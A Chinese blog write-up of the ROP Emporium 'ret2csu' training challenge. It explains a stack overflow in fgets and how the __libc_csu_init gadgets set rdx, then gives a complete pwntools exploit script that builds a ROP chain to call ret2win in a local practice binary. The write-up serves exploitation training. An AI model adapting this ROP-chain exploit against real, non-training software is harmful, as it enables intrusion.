---
title: ROP Emporium の ret2csu
date: 2020-06-15 17:00:29
categories:
- WriteUPs
- ROP Emprium
tags:
- PWN
- ROP
- Stack
---
## Introduction

&emsp;&emsp;[ROP Emporium](https://ropemporium.com)训练7：ret2csu的解析。

<!-- more -->

## ret2csu

### Step 1

&emsp;&emsp;程序运行图：

![](/img/ret2csu/ret2csu1.png)

&emsp;&emsp;checksec：

![](/img/ret2csu/ret2csu2.png)

&emsp;&emsp;根据提示，最终还是要调用ret2win函数，但是对相应寄存器有了一定限制。

### Step 2

&emsp;&emsp;把程序丢到hopper中发现pwnme函数中fgets函数存在溢出漏洞：

![](/img/ret2csu/ret2csu3.png)

&emsp;&emsp;根据提示我们是需要调用ret2win函数：

![](/img/ret2csu/ret2csu4.png)

&emsp;&emsp;并且提示我们需要将低3个参数即rdx寄存器的值置为0xdeadcafebabebeef，但是通过ROPgadget我们并没有找到可以控制rdx寄存器的gadgets：

![](/img/ret2csu/ret2csu5.png)

&emsp;&emsp;根据[ret2csu - 万能gadgets](https://coldwave96.github.io/2020/06/15/Useful-Gadgets/)我们可以选择利用万能gedgets实现传参：

![](/img/ret2csu/ret2csu6.png)

&emsp;&emsp;主要思路和easy_csu差不多，同样通过init_array_start函数的指针来跳过gadget2中的那条call指令。

### Step 3

&emsp;&emsp;EXP脚本如下：

```Python
* from pwn import *
* 
* sh = process('./ret2csu')
* elf = ELF('ret2csu')
* 
* gadget1 = 0x40089a
* gadget2 = 0x400880
* 
* init_addr = elf.symbols['__init_array_start']
* ret2win_addr = elf.symbols['ret2win']
* 
* payload = 'a' * (0x20 + 0x8)
* payload += p64(gadget1) + p64(0) + p64(1) + p64(init_addr) + p64(0) + p64(0)+ p64(0xdeadcafebabebeef)
* payload += p64(gadget2) + 'a' * 56
* payload += p64(ret2win_addr)
* 
* sh.recvuntil('>')
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;EXP脚本运行结果：

![](/img/ret2csu/ret2csu7.png)

## End

&emsp;&emsp;至此ROP Emporium的8个训练全部结束，完结，撒花～～
